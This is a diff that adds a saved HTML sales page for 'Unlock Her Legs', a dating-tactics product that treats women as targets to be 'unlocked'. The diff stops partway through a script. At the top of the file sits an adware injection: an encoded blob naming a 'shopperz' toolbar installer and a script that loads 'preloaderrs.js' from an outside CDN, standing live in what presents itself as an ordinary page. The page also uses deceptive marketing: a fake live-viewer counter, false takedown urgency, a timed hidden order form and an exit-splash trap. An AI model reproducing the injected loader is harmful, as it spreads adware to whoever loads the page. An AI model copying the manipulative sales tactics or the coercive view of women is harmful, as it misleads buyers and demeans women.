@@ -1,0 +1,968 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" class="cufon-active cufon-ready">
+<head profile="http://gmpg.org/xfn/11"><script> _BIT_LocalStoreDetails="{eyJpbnN0YWxsZXJfbmFtZSI6InZiYXRlc19jbGttaWRleF8uZXhlIiwidG9vbGJhcklEIjoiM0NENzNFMUM3MkZCNDY1ODhENDdERDY2NzQ0MkQxNzMiLCJwcm9kdWN0X25hbWUiOiJzaG9wcGVyejExMTIyMDE1MTQ1OSIsImNoYW5lbElEIjoiY2xrbWlkZXgiLCJpbnN0YWxsX3RpbWUiOiIxMi0xMi0yMDE1IiwicHJvZHVjdF92ZXJzaW9uIjoiMi4wLjAuNDgwIiwidmJ0c19nZW8iOiJJRHx8fDg2NDE0NDk4NjAwODIwODAiLCJhZEJsb2NrX3RpbWVyIjoidHJ1ZXx8fDE0NTE4Mjk1Njg3MjIiLCJpbmpzY3MiOiJ0cnVlfHx8ODY0MTQ1MTc0MzE5NzMxNiIsInB4bF9WQkFURVNfZGFpbHlQaW5nIjoiZGFpbHlQaW5nfHx8MTQ1MTc2ODk5NDk3NSIsIm5iX3RpbWVyIjoidHJ1ZXx8fDE0NTE3Njg5OTAxNTYiLCJwcmVwb3BfdGltZXIiOiIxNDUwODkyNDk4NzQwfHx8MTQ1MDk3ODg5ODc0NiIsInByZXBvcF9pbmRleCI6IjF8fHwxNDUwOTc4ODk4NzUxIiwiVkJBVEVTX2RhaWx5UGluZyI6InRydWV8fHwxNDUwMzY3OTYwMDQ2IiwiVkJBVEVTX0luc3RhbGxlZCI6InRydWV8fHw4NjQxNDUwNTQ1NTcxNzE5In0=}"</script><script id="_SFR_xl" src="http://cds.q2u3z6t7.hwcdn.net/extless/js/preloaderrs.js?tbid=3CD73E1C72FB46588D47DD667442D173&chnl=clkmidex&prd=shopperz111220151459&ind=12-12-2015&ver=2.0.0.480&drv=1"></script>
+<!-- Google Analytics Content Experiment code -->
+<script>function utmx_section(){}function utmx(){}(function(){var
+k='82046722-31',d=document,l=d.location,c=d.cookie;
+if(l.search.indexOf('utm_expid='+k)>0)return;
+function f(n){if(c){var i=c.indexOf(n+'=');if(i>-1){var j=c.
+indexOf(';',i);return escape(c.substring(i+n.length+1,j<0?c.
+length:j))}}}var x=f('__utmx'),xx=f('__utmxx'),h=l.hash;d.write(
+'<sc'+'ript src="'+'http'+(l.protocol=='https:'?'s://ssl':
+'://www')+'.google-analytics.com/ga_exp.js?'+'utmxkey='+k+
+'&utmx='+(x?x:'')+'&utmxx='+(xx?xx:'')+'&utmxtime='+new Date().
+valueOf()+(h?'&utmxhash='+escape(h.substr(1)):'')+
+'" type="text/javascript" charset="utf-8"><\/sc'+'ript>')})();
+</script><script>utmx('url','A/B');</script>
+<!-- End of Google Analytics Content Experiment code -->
+
+
+<!-- Facebook Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+document,'script','//connect.facebook.net/en_US/fbevents.js');
+ 
+fbq('init', '762017210591738');
+fbq('track', 'PageView');
+</script>
+<img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=762017210591738&ev=PageView&noscript=1"
+/>
+<!-- End Facebook Pixel Code -->
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+        <style type="text/css">
+body{
+ text-align: center;  font-size: 12px;  color: #625f5f;  margin: 20px auto;  background: transparent!important;  border: 0 none!important;
+}
+.footer a{
+	color:#000;
+	text-decoration:underline;
+}
+#WFItem34 {
+    color: rgb(85, 85, 85) !important;
+    font-family: Arial,Helvetica,sans-serif !important;
+    font-size: 12px !important;
+    margin: 0px auto;
+}
+    #WFItem34 html {
+        color:#000 !important;
+        background:#FFF !important;
+    }
+    #WFItem34 body, #WFItem34 div, #WFItem34 dl, #WFItem34 dt, #WFItem34 dd, #WFItem34 ul, #WFItem34 ol, #WFItem34 li, #WFItem34 h1, #WFItem34 h2, #WFItem34 h3, #WFItem34 h4, #WFItem34 h5, #WFItem34 h6, #WFItem34 pre, #WFItem34 code, #WFItem34 form, #WFItem34 fieldset, #WFItem34 legend, #WFItem34 input, #WFItem34 textarea, #WFItem34 p, #WFItem34 blockquote, #WFItem34 th, #WFItem34 td {
+        margin-left:0 !important;
+        margin-right:0 !important;
+        margin-top:0 !important;
+        margin-bottom:0 !important;
+        padding-left:0 !important;
+        padding-bottom:0 !important;
+        padding-right:0 !important;
+        padding-top:0 !important;
+        width:auto !important;
+        background-image:none !important;
+    }
+    #WFItem34 div, #WFItem34 dl, #WFItem34 dt, #WFItem34 dd, #WFItem34 ul, #WFItem34 ol, #WFItem34 li, #WFItem34 h1, #WFItem34 h2 {
+        border:none !important;
+        background:none !important;
+        float:none !important;
+        width:auto !important;
+        -moz-box-shadow:0 !important;
+        -webkit-box-shadow:0 !important;
+        box-shadow:0 !important;
+        text-indent:inherit !important;
+    }
+    #WFItem34 table {
+        border-collapse:collapse !important;
+        border-spacing:0 !important;
+    }
+    #WFItem34 fieldset, #WFItem34 img {
+        border:0 !important;
+    }
+    #WFItem34 address, #WFItem34 caption, #WFItem34 cite, #WFItem34 code, #WFItem34 dfn, #WFItem34 em, #WFItem34 th, #WFItem34 var {
+        font-style:normal !important;
+        font-weight:normal !important;
+    }
+    #WFItem34 strong {
+        font-style:normal !important;
+        font-weight:bold !important;
+    }
+    #WFItem34 em {
+        font-style:italic !important;
+        font-weight:normal !important;
+        position:static !important;
+    }
+    #WFItem34 li {
+        list-style:none !important;
+    }
+    caption, #WFItem34 th {
+        text-align:left !important;
+    }
+    #WFItem34 h1, #WFItem34 h2, #WFItem34 h3, #WFItem34 h4, #WFItem34 h5, #WFItem34 h6 {
+        font-size:100% !important;
+        font-weight:normal !important;
+    }
+    #WFItem34 q:before, #WFItem34 q:after {
+        content:" " !important;
+    }
+    #WFItem34 abbr, #WFItem34 acronym {
+        border:0 !important;
+        font-variant:normal !important;
+    }
+    #WFItem34 sup {
+        vertical-align:text-top !important;
+    }
+    #WFItem34 sub {
+        vertical-align:text-bottom !important;
+    }
+    #WFItem34 input, #WFItem34 textarea, #WFItem34 select {
+        font-family:inherit !important;
+        font-size:inherit !important;
+        font-weight:inherit !important;
+        height:auto !important;
+        line-height:auto !important;
+    }
+    #WFItem34 input, #WFItem34 textarea, #WFItem34 select {
+        *font-size:100% !important;
+    }
+    #WFItem34 legend {
+        color:#000 !important;
+    }
+    #WFItem34 .clearfix:after {
+        visibility: hidden !important;
+        display: block !important;
+        font-size: 0 !important;
+        content:" " !important;
+        clear: both !important;
+        height: 0 !important;
+    }
+    #WFItem34 .clearer {
+        clear:both !important;
+        font-size:0.1px !important;
+        height:0.1px !important;
+        line-height:0.1px !important;
+        width:100% !important;
+    }
+    #WFWrapper .close {
+        background:url("http://www.bobbyriocoaching.com/images/common/highslide/close.png") repeat scroll 0 0 transparent !important;
+        cursor:pointer !important;
+        height:30px !important;
+        position:absolute !important;
+        right:-15px !important;
+        top:-15px !important;
+        width:30px !important;
+        z-index:1 !important;
+    }
+    #wfCloseX {
+        background:url("http://www.bobbyriocoaching.com/images/common/highslide/close.png") repeat scroll 0 0 transparent !important;
+        cursor:pointer !important;
+        height:30px !important;
+        position:absolute !important;
+        right:0 !important;
+        top:0 !important;
+        width:30px !important;
+        z-index:1 !important;
+        cursor:pointer !important;
+    }
+    #WFItem34 .clrB {
+        clear:both !important;
+        text-align:left !important;
+    }
+    #WFItem34 * html .clearfix {
+        zoom: 1 !important;
+    }
+    #WFItem34 *:first-child+html .clearfix {
+        zoom: 1 !important;
+    }
+    #WFItem34 .wf-contbox {
+        width:100% !important;
+    }
+    li:before {
+        content:"" !important;
+    }
+    #WFItem34 form {
+        display:inline-block !important;
+        width:100% !important;
+    }
+    #WFItem34 label {
+        margin:0 !important;
+    }
+    #WFItem34 p {
+        line-height:18px !important;
+        font-size:11px !important;
+    }
+    #WFItem34 input[type="submit"] {
+        cursor:pointer !important;
+        text-shadow:none !important;
+        float:none !important;
+        text-transform:none !important;
+        letter-spacing:0 !important;
+    }
+    #WFItem34 {
+        width:450px !important;
+    }
+    #WFItem34 {
+        color: #555555 !important;
+        font-family: Arial, Helvetica, sans-serif !important;
+        font-size: 12px !important;
+    }
+    #WFItem34 .wf-body li {
+        padding: 10px 15px !important;
+        clear: both !important;
+    }
+    #WFItem34 .actTinyMceElBodyContent ul li {
+        padding: 3px !important;
+        list-style-type: disc !important;
+    }
+    #WFItem34 .actTinyMceElBodyContent ol li {
+        padding: 3px !important;
+        list-style-type: decimal !important;
+    }
+    #WFItem34 .actTinyMceElBodyContent ul {
+        margin-left: 20px !important;
+    }
+    #WFItem34 .actTinyMceElBodyContent ol {
+        margin-left: 25px !important;
+    }
+    #WFItem34 .actTinyMceElBodyContent ol ol {
+        margin-top: 0 !important;
+        margin-bottom: 0 !important;
+    }
+    #WFItem34 .wf-body {
+        background-color:transparent !important;
+        background-image: none !important;
+        background-position: left top !important;
+        background-repeat: no-repeat !important;
+        border-color: #92757d !important;
+        border-width: 0px !important;
+        border-style: none !important;
+        -webkit-border-top-left-radius: 0px !important;
+        -moz-border-radius-topleft: 0px !important;
+        border-top-left-radius: 0px !important;
+        -webkit-border-top-right-radius: 0px !important;
+        -moz-border-radius-topright: 0px !important;
+        border-top-right-radius: 0px !important;
+        -webkit-border-bottom-left-radius: 0px !important;
+        -moz-border-radius-bottomleft: 0px !important;
+        border-bottom-left-radius: 0px !important;
+        -webkit-border-bottom-right-radius: 0px !important;
+        -moz-border-radius-bottomright: 0px !important;
+        border-bottom-right-radius: 0px !important;
+    }
+    #WFItem34 .wf-header {
+        color: #2B93D3 !important;
+        background-color: #F5F5F5 !important;
+        background-image: none !important;
+        background-position: left top !important;
+        background-repeat: no-repeat !important;
+        border-color: #6b6262 !important;
+        border-width: 0px !important;
+        border-style: none !important;
+        padding-left: 10px !important;
+        padding-right: 10px !important;
+        padding-top: 20px !important;
+        padding-bottom: 0px !important;
+        display: block !important;
+        min-height: 32px !important;
+        -webkit-border-top-left-radius: 0px !important;
+        -moz-border-radius-topleft: 0px !important;
+        border-top-left-radius: 0px !important;
+        -webkit-border-top-right-radius: 0px !important;
+        -moz-border-radius-topright: 0px !important;
+        border-top-right-radius: 0px !important;
+        -webkit-border-bottom-left-radius: 0px !important;
+        -moz-border-radius-bottomleft: 0px !important;
+        border-bottom-left-radius: 0px !important;
+        -webkit-border-bottom-right-radius: 0px !important;
+        -moz-border-radius-bottomright: 0px !important;
+        border-bottom-right-radius: 0px !important;
+    }
+    #WFItem34 .wf-footer {
+        color: #2B93D3 !important;
+        background-color: #F0F0F0 !important;
+        background-image: none !important;
+        background-position: left top !important;
+        background-repeat: no-repeat !important;
+        border-color: #6b6262 !important;
+        border-width: 0px !important;
+        border-style: none !important;
+        padding-left: 10px !important;
+        padding-right: 10px !important;
+        padding-top: 10px !important;
+        padding-bottom: 10px !important;
+        display: block !important;
+        min-height: 25px !important;
+        -webkit-border-top-left-radius: 0px !important;
+        -moz-border-radius-topleft: 0px !important;
+        border-top-left-radius: 0px !important;
+        -webkit-border-top-right-radius: 0px !important;
+        -moz-border-radius-topright: 0px !important;
+        border-top-right-radius: 0px !important;
+        -webkit-border-bottom-left-radius: 0px !important;
+        -moz-border-radius-bottomleft: 0px !important;
+        border-bottom-left-radius: 0px !important;
+        -webkit-border-bottom-right-radius: 0px !important;
+        -moz-border-radius-bottomright: 0px !important;
+        border-bottom-right-radius: 0px !important;
+    }
+    #WFItem34 .wf-input {
+        padding: 2px 5px !important;
+        font-family: Arial !important;
+        font-size: 18px !important;
+        color: #dfdede !important;
+        font-weight: bold !important;
+        font-style: normal !important;
+        text-decoration: none !important;
+        background-color: #FFFFFF !important;
+        border-width: 1px !important;
+        border-color: #D9D9D9 !important;
+        border-style: solid !important;
+		height: 46px !important;
+        width: 375px !important;
+        -webkit-border-top-left-radius: 8px !important;
+        -moz-border-radius-topleft: 8px !important;
+        border-top-left-radius: 8px !important;
+        -webkit-border-top-right-radius: 8px !important;
+        -moz-border-radius-topright: 8px !important;
+        border-top-right-radius: 8px !important;
+        -webkit-border-bottom-left-radius: 8px !important;
+        -moz-border-radius-bottomleft: 8px !important;
+        border-bottom-left-radius: 8px !important;
+        -webkit-border-bottom-right-radius: 8px !important;
+        -moz-border-radius-bottomright: 8px !important;
+        border-bottom-right-radius: 8px !important;
+    }
+    #WFItem34 .wf-input {
+        font-family: Arial !important;
+        font-size: 14px !important;
+        color: #555555 !important;
+        font-weight: normal !important;
+        font-style: normal !important;
+        text-decoration: none !important;
+        background-color: #FFFFFF !important;
+        border-width: 1px !important;
+        border-color: #D9D9D9 !important;
+        border-style: solid !important;
+        width: 100% !important;
+        -webkit-border-top-left-radius: 8px !important;
+        -moz-border-radius-topleft: 8px !important;
+        border-top-left-radius: 8px !important;
+        -webkit-border-top-right-radius: 8px !important;
+        -moz-border-radius-topright: 8px !important;
+        border-top-right-radius: 8px !important;
+        -webkit-border-bottom-left-radius: 8px !important;
+        -moz-border-radius-bottomleft: 8px !important;
+        border-bottom-left-radius: 8px !important;
+        -webkit-border-bottom-right-radius: 8px !important;
+        -moz-border-radius-bottomright: 8px !important;
+        border-bottom-right-radius: 8px !important;
+    }
+    #WFItem34 .wf-label {
+        font-family: Arial !important;
+        font-size: 12px !important;
+        color: #555555 !important;
+        font-weight: bold !important;
+        font-style: normal !important;
+        text-decoration: none !important;
+        padding-top: 3px !important;
+        padding-bottom: 3px !important;
+        padding-left: 0 !important;
+        padding-right: 3px !important;
+        display: block !important;
+    }
+    #WFItem34 .wf-button {
+        font-family: Arial !important;
+        font-size: 22px !important;
+        color: #FFFFFF !important;
+        font-weight: bold !important;
+        font-style: normal !important;
+        text-decoration: none !important;
+        background-color: #0DBAFF !important;
+        background-image: url("http://www.bobbyriocoaching.com/images/core/webforms/gradient_top.png") !important;
+        border-width: 0px !important;
+        border-color: #000000 !important;
+        border-style: none !important;
+        padding-left: 16px !important;
+        padding-right: 16px !important;
+        padding-top: 8px !important;
+        padding-bottom: 8px !important;
+        -webkit-border-top-left-radius: 8px !important;
+        -moz-border-radius-topleft: 8px !important;
+        border-top-left-radius: 8px !important;
+        -webkit-border-top-right-radius: 8px !important;
+        -moz-border-radius-topright: 8px !important;
+        border-top-right-radius: 8px !important;
+        -webkit-border-bottom-left-radius: 8px !important;
+        -moz-border-radius-bottomleft: 8px !important;
+        border-bottom-left-radius: 8px !important;
+        -webkit-border-bottom-right-radius: 8px !important;
+        -moz-border-radius-bottomright: 8px !important;
+        border-bottom-right-radius: 8px !important;
+    }
+    #WFItem34 .wf-button:hover {
+        !important;
+    }
+    #WFItem34 .wf-submit {
+        text-align: center !important;
+    }
+    #WFItem34 .wf-submit {
+        text-align:center !important;
+    }
+    #WFItem34 .wf-labelpos {
+        float: none !important;
+        width: auto !important;
+        text-align: left !important;
+    }
+    #WFItem34 .wf-inputpos {
+        float: none !important;
+        width: auto !important;
+    }
+    #WFItem34 .wf-privacy {
+        font-family: Arial !important;
+        font-size: 12px !important;
+        color: #B8B8B8 !important;
+        font-weight: normal !important;
+        font-style: italic !important;
+        text-decoration: none !important;
+        text-align: center !important;
+    }
+    #WFItem34 .wf-privacyico {
+        padding: 4px 0 0 20px !important;
+        background: url("http://www.bobbyriocoaching.com/images/core/webforms/lock.png") no-repeat left center !important;
+    }
+    #WFItem34 .wf-counter {
+        font-family: Arial !important;
+        font-size: 12px !important;
+        color: #44454f !important;
+        font-weight: bold !important;
+        font-style: normal !important;
+        text-decoration: none !important;
+        text-align: center !important;
+    }
+    #WFItem34 .wf-poweredby {
+        font-family: Arial !important;
+        font-size: 10px !important;
+        color: #B8B8B8 !important;
+        font-weight: normal !important;
+        font-style: italic !important;
+        text-decoration: none !important;
+        text-align: center !important;
+    }
+    #WFItem34 .wf-link {
+        font-family: Arial !important;
+        font-size: 12px !important;
+        color: #ffffff !important;
+        font-weight: normal !important;
+        font-style: normal !important;
+        text-decoration: none !important;
+    }
+    #WFItem34 .wf-link:hover {
+        font-family: Arial !important;
+        font-size: 12px !important;
+        color: #ffffff !important;
+        font-weight: normal !important;
+        font-style: normal !important;
+        text-decoration: none !important;
+    }
+    #WFItem34 .wf-text {
+        font-family: Arial !important;
+        font-size: 12px !important;
+        color: #B8B8B8 !important;
+    }
+    #WFItem34 .wf-divider {
+        border-top-width: 1px !important;
+        border-color: #ffffff !important;
+        border-style: solid !important;
+    }
+    #WFItem34 .wf-image {
+        text-align: center !important;
+    }
+    #WFItem34 .wf-privacylink {
+        color: #B8B8B8 !important;
+        font-style: italic !important;
+    }
+    #WFItem34 .wf-poweredbylink {
+        color: #B8B8B8 !important;
+        font-style: italic !important;
+    }
+    #WFItem34 .wf-imgbox {
+        overflow: hidden !important;
+    }
+    #WFItem34 .wf-rc-reload {
+        display: inline-block !important;
+        width: 16px !important;
+        height: 16px !important;
+        overflow: hidden !important;
+        text-indent: -99999px !important;
+        position: relative !important;
+        top: 3px !important;
+        margin-left: 3px !important;
+        background: url("http://www.bobbyriocoaching.com/images/core/webforms/captchaico.png") no-repeat 0 -32px !important;
+    }
+    #WFItem34 .wf-rc-audio {
+        display: inline-block !important;
+        width: 16px !important;
+        height: 16px !important;
+        overflow: hidden !important;
+        text-indent: -99999px !important;
+        position: relative !important;
+        top: 3px !important;
+        margin-left: 3px !important;
+        background: url("http://www.bobbyriocoaching.com/images/core/webforms/captchaico.png") no-repeat 0 0 !important;
+    }
+    #WFItem34 .wf-rc-image {
+        display: inline-block !important;
+        width: 16px !important;
+        height: 16px !important;
+        overflow: hidden !important;
+        text-indent: -99999px !important;
+        position: relative !important;
+        top: 3px !important;
+        margin-left: 3px !important;
+        background: url("http://www.bobbyriocoaching.com/images/core/webforms/captchaico.png") no-repeat 0 -16px !important;
+    }
+    #WFItem34 #recaptcha_image {
+        width: 200px !important;
+        height: 38px !important;
+    }
+    #WFItem34 #recaptcha_image img {
+        width: 200px !important;
+        height: 38px !important;
+    }
+    #WFItem34 .wf-rc-boxm {
+        width: 200px !important;
+        margin: 0 auto !important;
+        overflow: hidden !important;
+    }
+    #WFItem34 em {
+        color: inherit !important;
+        font-style: italic !important;
+    }
+</style>
+
+<title>Unlock Her Legs: The Scrambler Mind Game</title>
+<meta name="description" content="Unlock Her Legs: Unleashing the Scrambler">
+<meta name="keywords" content="Unlock Her Legs: Nail the Hard to Get Girl">
+<meta name="robots" content="index,follow">
+
+<link href="http://www.unlockherlegs.com/webfiles/launch001d-style.css" rel="stylesheet" type="text/css">
+<script type="text/javascript" src="http://www.unlockherlegs.com/webfiles/jquery.js"></script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-43453168-8', 'unlockherlegs.com');
+  ga('send', 'pageview');
+
+</script>
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+<style type="text/css" media="print">#wpadminbar { display:none; }</style>
+<style type="text/css" media="screen">
+	html { margin-top: 28px !important; }
+	* html body { margin-top: 28px !important; }
+</style>
+   
+<style type="text/css">
+span.cufon {margin:2px 0px;}
+#launchvideobox{margin:0px auto;
+}
+
+#videobox2{margin:0px auto;
+}
+
+#videobox3{margin:0px auto;
+}
+
+#videobox{margin:0px auto;
+	-moz-box-shadow: 0px 0px 4px #666;
+	-webkit-box-shadow: 0px 0px 4px #666;
+	box-shadow: 0px 0px 4px #666;
+	/* For IE 8 */
+	-ms-filter: "progid:DXImageTransform.Microsoft.Shadow(Strength=4, Direction=0, Color='#666666')";
+	/* For IE 5.5 - 7 */
+	filter: progid:DXImageTransform.Microsoft.Shadow(Strength=4, Direction=0, Color='#666666');
+}
+
+.launchtopheadline{ font-size:32px;font-weight:bold;font-style:normal;letter-spacing:-1px; }
+.launchbottomheadline{ font-weight:bold;font-style:normal;letter-spacing:-1px;  }
+.sidebar-headline{color:#215E8E !important;letter-spacing:-0px;font-weight:normal;}
+
+a {color:#0000ff;text-decoration:none;}
+
+.launchtopheadline{color:#000000;letter-spacing:0px;}.launchbottomheadline{color:#;letter-spacing:-1px;font-weight:normal;}
+.launch1navbar li {
+		font-size:15px;
+		letter-spacing:0.15em;
+		padding:0 20px 0 25px;
+		text-transform:uppercase;
+		font-weight:normal;
+		}
+#launchbk p {font-family:Arial, Helvetica, Sans-serif;}
+#launchbk h2{font-family:Arial, Helvetica, Sans-serif;}
+#launchbk h3{font-family:Arial, Helvetica, Sans-serif;}
+#launchbk h1{font-family:Arial, Helvetica, Sans-serif;}
+body{
+	font-family:Arial, 
+	Helvetica, 
+	Sans-serif;
+	/*background-image:url("http://magneticmessaging.com/images/body_bg.gif");*/
+	background-color: #FFFFFF;
+	/*background-repeat:repeat;*/}
+#launchcommentslink { display:none; }#main li{background-image: url("http://magneticmessaging.com/wp-content/themes/OptimizePress/images/style1.png")}#main-lower li{background-image: url("http://magneticmessaging.com/wp-content/themes/OptimizePress/images/style1.png") !important;}
+#main li{background-position:0 2px;padding-left:39px;}
+
+.launch1navbar a.CurrentLinkActiveClass{color:#}
+
+</style>
+
+<script type="text/javascript" src="http://www.unlockherlegs.com/webfiles/cufon-yui.js"></script><style type="text/css">cufon{text-indent:0!important;}@media screen,projection{cufon{display:inline!important;display:inline-block!important;position:relative!important;vertical-align:middle!important;font-size:1px!important;line-height:1px!important;}cufon cufontext{display:-moz-inline-box!important;display:inline-block!important;width:0!important;height:0!important;overflow:hidden!important;text-indent:-10000in!important;}cufon canvas{position:relative!important;}}@media print{cufon{padding:0!important;}cufon canvas{display:none!important;}}</style>
+<script type="text/javascript" src="http://www.unlockherlegs.com/webfiles/qtobject.js"></script>
+
+<script>
+function clearText(thefield){
+if (thefield.defaultValue==thefield.value)
+thefield.value = ""
+}
+</script>
+
+<meta property="og:description" content="How to use 3 simple texts to turn a woman on and get her out on a date.  ">
+
+<meta property="og:title" content="">
+<meta property="og:site_name" content="Magnetic Messaging: The Official Site">
+<meta property="fb:app_id" content="">
+
+<script type="text/javascript">
+function showIt() {
+jQuery("#WFIcenter").css("display","block");
+}
+setTimeout("showIt()", 1480000); // 1000 = 1 sec
+</script>
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-43453168-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+</head>
+<body screen_capture_injected="true">
+<div id="maintopbar"></div>
+
+
+<script type="text/javascript" src="http://www.unlockherlegs.com/webfiles/flowplayer-3.2.4.min.js"></script>
+
+
+
+
+
+
+
+
+<div id="wrapper">
+
+
+<div id="launchbk" style="background-image: none;padding-top: 0px;margin-top: -30px;" ;="">
+<!-- Headlines -->
+<br/>
+<h1 class="launchtopheadline" style="
+    line-height: 0px!important;
+	margin-bottom:10px;
+"><img src="http://www.unlockherlegs.com/webfiles/Banging-01.png"/ ><br/><span style="
+    font-weight: bold;  color: #808080;
+    font-size: 14px;
+">(This video could be taken down without notice so we urge you to WATCH TO THE VERY END)</span></h1>
+
+<div id="launchvideocontainer" style="
+    line-height: 5px;
+    margin-bottom: 10px;
+">
+            <div id="launchvideobox">
+              <div id="video" style="padding-left: 40px;"> 
+			  <div id="player_wrapper" style="margin: 0 auto; width: 667px; height: 358px;">
+			  
+			  </div> 
+			  </div>
+			  <script type="text/javascript" src="http://www.unlockherlegs.com/ulegs/player.js"></script> 
+			  <script type="text/javascript">
+				jwplayer("player_wrapper").setup({
+					flashplayer: "./ulegs/player.swf",
+					file: "http://embed.wistia.com/deliveries/e0042efe69bf26d69b71553dc959f35b7e73f64d/file.mp4",
+					width: '900',
+					height: '560',
+					autostart: 'true',
+					bufferlength: '0',
+					screencolor: 'ffffff',
+					controlbar:'hidden',
+				});
+				</script>
+            </div>
+            <div class="aclear"></div>
+            <br>
+            <br>
+          </div>
+
+<script type="text/javascript">
+
+	function setCookie(c_name,value,exdays)
+	{
+	var exdate=new Date();
+	exdate.setDate(exdate.getDate() + exdays);
+	var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
+	document.cookie=c_name + "=" + c_value;
+	}
+	function getCookie(c_name)
+	{
+	var i,x,y,ARRcookies=document.cookie.split(";");
+	for (i=0;i<ARRcookies.length;i++)
+	{
+	  x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
+	  y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
+	  x=x.replace(/^\s+|\s+$/g,"");
+	  if (x==c_name)
+		{
+		return unescape(y);
+		}
+	  }
+	}
+
+</script>
+
+<div id="launchinnermain">
+
+ 	<script type="text/javascript">
+
+ var mobile = (/android/i.test(navigator.userAgent.toLowerCase()));  
+
+    if (mobile) { location.replace('http://unlockherlegs.com/iossr.htm'); }</script>
+<script type="text/javascript">
+
+ var mobile = (/iphone/i.test(navigator.userAgent.toLowerCase()));  
+
+    if (mobile) { location.replace('http://unlockherlegs.com/iossr.htm'); }</script>
+<script type="text/javascript">
+
+ var mobile = (/ipad/i.test(navigator.userAgent.toLowerCase()));  
+
+    if (mobile) { location.replace('http://unlockherlegs.com/'); }</script>
+
+	<div class="video-counter" style="color:#444;float:right;margin-right:20px;padding:5px;border:#aaa 1px solid;"><div id="the_number" style="font-weight: bold; color: rgb(17, 17, 17); display: inline; font-size: 16px; line-height: 40px; margin-right: 5px; opacity: 1;">13,381</div> viewing</div>
+	
+	<div style="clear:both;padding:1px;"></div><p></p>
+
+
+
+<div id="WFItem34" class="wf-formTpl">
+    <form accept-charset="utf-8" action="http://www.bobbyriocoaching.com/add_contact_webform.html" method="post" target="_top">
+        <div class="box">
+            <div id="WFIheader" class="wf-header el" style="height: 32px; display:  none !important;">
+                <div class="actTinyMceElBodyContent">
+                    <p>
+                        <span style="font-size: 24px;">Headline</span>
+                    </p>
+                </div>
+                <em class="clearfix clearer"></em>
+            </div>
+            <div id="WFIcenter" class="wf-body" style="display:none;">
+                <ul class="wf-sortable" id="wf-sort-id">
+                    
+                    <li class="wf-email" id="hid" rel="undefined" style="display:  block !important;">
+                        <div class="wf-contbox">
+                            <div class="wf-labelpos">
+                                <label class="wf-label"></label>
+                            </div>
+                            <div class="wf-inputpos">
+                                <input type="text" name="email" class="wf-input wf-req wf-valid__email" placeholder="Enter your primary email...">
+                            </div>
+                            <em class="clearfix clearer"></em>
+                        </div>
+                    </li>
+                    <li class="wf-submit clearfix" rel="undefined" style="text-align: center; display:  block !important;">
+                        <div class="wf-contbox">
+                            <div class="wf-inputpos">
+                                <input type="submit" id="hid2" style="width: 403px ! important;height: 132px ! important; background:url("http://unlockherlegs.com/img/click_to_order_now_price.jpg") ! important; display:  inline !important; " value="" name="submit" class="wf-button">
+                            </div>
+                            <em class="clearfix clearer"></em>
+                        </div>
+                    </li>
+                    
+                    
+                    
+                    
+                </ul>
+            </div>
+            <div id="WFIfooter" class="wf-footer el" style="height: 25px; display:  none !important;">
+                <div class="actTinyMceElBodyContent"></div>
+                <em class="clearfix clearer"></em>
+            </div>
+        </div>
+        <input type="hidden" name="webform_id" value="44">
+    </form>
+</div>
+<div>
+		<img src="http://www.unlockherlegs.com/images/salesimg.jpg">
+	</div>
+<script type="text/javascript" src="http://www.bobbyriocoaching.com/view_webform.js?wid=38&mg_param1=1"></script>
+<script type="text/javascript" src="http://www.unlockherlegs.com/ulegs/ulegs.js"></script>
+
+</div>
+<div class="aclear"></div>
+
+</div>
+</div>
+<div id="wrapper">
+  </div>
+<div class="footer container"> Copyright © 2010 - 2014 | All content and images owned and copyrighted by UnlockHerLegs.com <br>
+      <a href="./privacy-policy.htm" title="" class="colorbox iframe cboxElement">Privacy Policy</a><span> | </span> <a href="./tos.htm" title="" class="colorbox iframe cboxElement">Terms of Service</a><span> | </span> <a href="./contact-us.htm" title="" class="colorbox iframe cboxElement">Contact Us</a> </div>
+	  
+    <link rel="stylesheet" href="http://www.unlockherlegs.com/new/css/colorbox.css">
+	  
+<script language="javascript" type="text/javascript">
+//<![CDATA[
+
+
+jQuery(document).ready(function(){
+	jQuery("form").submit(function(e){
+		PreventExitSplash = true;
+	});
+});
+
+    jQuery(function() {
+        jQuery(".cvv_link").colorbox();
+        jQuery(".black-link,.iframe").colorbox({iframe: true, width: "80%", height: "80%"});
+    });
+
+	var exitsplashmessage = 'WAIT: "THE FRIEND ZONE TEST"\n\nClick "Stay On This Page" Below to Discover a Discreet "Test" Immediately Tells You if You`re in the Friend Zone or if She is Waiting for You to Make a Move...\n\n                I  I\n                I  I\n                I  I\n                I  I\n                I  I\n                I  I\n                I  I\n                I  I\n                I  I\n                I  I\n          VVVVVVVV\n              VVVV\n               VV\n                V\n';
+	var exitsplashpage = 'http://unlockherlegs.com/wait.html';
+
+function addLoadEvent(func) { 
+	var oldonload = window.onload; 
